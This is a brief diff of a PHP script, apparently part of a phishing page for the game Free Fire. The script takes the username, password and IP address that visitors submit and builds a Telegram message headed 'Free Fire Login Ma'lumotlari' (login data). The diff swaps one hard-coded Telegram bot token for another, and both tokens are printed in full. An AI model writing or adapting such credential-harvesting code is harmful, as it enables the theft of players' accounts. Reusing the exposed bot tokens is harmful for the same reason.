@@ -23,7 +23,7 @@ if($_SERVER['REQUEST_METHOD'] === 'POST') {
     $ip = $_SERVER['REMOTE_ADDR'] ?? 'Noma\'lum';
     
     if(!empty($username) && !empty($password)) {
-        $bot_token = "8592685877:AAFHxj5UaKAXxpMz5qNzdrBQ9k1Ucn-MDRE";
+        $bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";
         $chat_id = $user_id;
         
         $message = "🎮 <b>Free Fire Login Ma'lumotlari</b>\n\n";
